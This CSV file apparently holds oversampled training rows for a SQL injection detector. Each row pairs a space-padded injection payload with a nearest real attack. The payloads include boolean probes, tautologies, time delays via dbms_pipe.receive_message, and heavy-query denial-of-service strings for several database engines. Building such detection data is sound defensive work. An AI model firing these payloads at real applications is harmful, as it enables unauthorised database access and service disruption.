id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001171,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",nearest_attack_euclidean,R000090,2.1633172767136752
SMOTE_001172,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000126,0.47604968727131314
SMOTE_001173,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,2.3911803680347474
SMOTE_001174,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000126,1.2690144492639208
SMOTE_001175,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.3386000000465145
SMOTE_001176,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000028,0.21876873035599337
SMOTE_001177,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,1.0765235475280626
SMOTE_001178,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000071,0.7527565619226239
SMOTE_001179,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000061,2.290941466855434
SMOTE_001180,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.8495812391566242
SMOTE_001181,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.7791939162815995
SMOTE_001182,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000083,0.32996460014791773
SMOTE_001183,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000008,1.2985029403123325
SMOTE_001184,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,0.8466973772759981
SMOTE_001185,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,1.7767573981588658
SMOTE_001186,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.36576211626382127
SMOTE_001187,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,1.0446521787131515
SMOTE_001188,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000138,0.26106416177846564
SMOTE_001189,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000140,1.4252776873831574
SMOTE_001190,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000038,0.6737591586544431
SMOTE_001191,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000013,0.07396576578751504
SMOTE_001192,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,1.339141514537826
SMOTE_001193,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,0.5988663014502911
SMOTE_001194,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000098,0.26883228064862347
SMOTE_001195,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,0.3935392965039325
SMOTE_001196,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.33932624104285
SMOTE_001197,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000020,0.0020178624437992496
SMOTE_001198,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000144,0.27748229144837644
SMOTE_001199,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000137,2.072078914445251
SMOTE_001200,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,0.5961609219175334
SMOTE_001201,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000060,1.0122286445820345
SMOTE_001202,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.08557892766912867
SMOTE_001203,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,1.7436304522405344
SMOTE_001204,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,1.068261229765444
SMOTE_001205,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000122,1.2912500414205665
SMOTE_001206,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,1.0247010623511361
SMOTE_001207,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000066,1.4817455138773057
SMOTE_001208,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.35176719844231175
SMOTE_001209,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,0.551543777103875
SMOTE_001210,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,1.6890353543408643
SMOTE_001211,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.4384528382319861
SMOTE_001212,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.1636245873657376
SMOTE_001213,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.7556576476250807
SMOTE_001214,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,nearest_attack_euclidean,R000102,0.5083476615006159
SMOTE_001215,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000081,4.129554827560741
SMOTE_001216,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,0.0565242256806194
SMOTE_001217,attack,boolean,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000152,1.4750586910500003
SMOTE_001218,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",nearest_attack_euclidean,R000090,1.1159513585283887
SMOTE_001219,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000071,1.4928589298325277
SMOTE_001220,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,1.6439507823358839
SMOTE_001221,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,0.3218802364418156
SMOTE_001222,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.051520278361300124
SMOTE_001223,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,1.8249121623864146
SMOTE_001224,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,1.3750886684377637
SMOTE_001225,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,1.722533945156827
SMOTE_001226,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000026,0.3890971541410385
SMOTE_001227,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,0.9089829197528602
SMOTE_001228,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.012648590962367855
SMOTE_001229,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,1.421740562025201
SMOTE_001230,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,0.16714601019721842
SMOTE_001231,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,0.24405148744239266
SMOTE_001232,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000123,0.2579386504310121
SMOTE_001233,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.9917825459669851
SMOTE_001234,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,1.1651822195450687
SMOTE_001235,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,1.2757491037740707
SMOTE_001236,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,1.3667989728362204
SMOTE_001237,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,2.4819956604400444
SMOTE_001238,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.06041444468767644
SMOTE_001239,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.5580609537100123
SMOTE_001240,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.10608285024652664
SMOTE_001241,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,1.6335514693377151
SMOTE_001242,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.4724513736727574
SMOTE_001243,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000136,0.2797775322742367
SMOTE_001244,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.3112617314142053
SMOTE_001245,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.21970174025168493
SMOTE_001246,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000130,1.3347613827901352
SMOTE_001247,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,0.7921695407308184
SMOTE_001248,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.0237331816157667
SMOTE_001249,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.47243561987693194
SMOTE_001250,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.37319652664952335
SMOTE_001251,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,1.1374300217476088
SMOTE_001252,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000156,1.1994311630521268
SMOTE_001253,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,0.46731553968466444
SMOTE_001254,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,1.055114522279413
SMOTE_001255,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000001,1.1658520077707917
SMOTE_001256,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000094,0.17827704587693208
SMOTE_001257,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000112,1.4340569494732143
SMOTE_001258,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000137,1.9370584840469411
SMOTE_001259,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,0.8393706102266135
SMOTE_001260,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.07874386582874433
SMOTE_001261,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000042,0.35972783237212214
SMOTE_001262,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.5535123389309128
SMOTE_001263,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000055,0.3415274069670583
SMOTE_001264,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000053,0.5345119108365344
SMOTE_001265,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R000065,0.1366319428046851
SMOTE_001266,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000020,0.02702243994967323
SMOTE_001267,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000016,0.7679863193613531
SMOTE_001268,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,0.33755277840039327
SMOTE_001269,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,0.9592441855290993
SMOTE_001270,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000010,1.1200477138984493
SMOTE_001271,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000024,1.7884801331054099
SMOTE_001272,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000096,0.9002229162616509
SMOTE_001273,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000114,0.35325168039767374
SMOTE_001274,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,1.2357836842758305
SMOTE_001275,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000066,0.85696358348094
SMOTE_001276,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,0.10700221811707661
SMOTE_001277,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",nearest_attack_euclidean,R000058,0.32069391381411255
SMOTE_001278,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,1.505121025732477
SMOTE_001279,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,0.4278525173131965
SMOTE_001280,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.464927748345778
SMOTE_001281,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,1.1847404876187848
SMOTE_001282,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,1.271843083951873
SMOTE_001283,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000070,1.2167811786366676
SMOTE_001284,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000080,0.22700378125934362
SMOTE_001285,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,0.08885603612508904
SMOTE_001286,attack,boolean,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000082,0.14498271703305418
SMOTE_001287,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000098,0.5976157997063503
SMOTE_001288,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000057,2.288847048646532
SMOTE_001289,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.02642925019909973
SMOTE_001290,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000105,0.4722690317992738
SMOTE_001291,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,0.5775621657961509
SMOTE_001292,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000066,1.378220642608343
SMOTE_001293,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,1.9504803130210635
SMOTE_001294,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000013,1.1440696097215226
SMOTE_001295,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,nearest_attack_euclidean,R000102,0.5727029346635208
SMOTE_001296,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000067,0.8655159250396328
SMOTE_001297,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,1.5352551247322874
SMOTE_001298,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,1.0415656743197814
SMOTE_001299,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000091,4.107899601864098
SMOTE_001300,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000154,1.5895452301980466
SMOTE_001301,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",nearest_attack_euclidean,R000124,0.038477658059866506
SMOTE_001302,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,1.2667359223374208
SMOTE_001303,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.011545644765261646
SMOTE_001304,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000099,1.049368881515088
SMOTE_001305,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,2.143174466334578
SMOTE_001306,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000010,1.0352662042894063
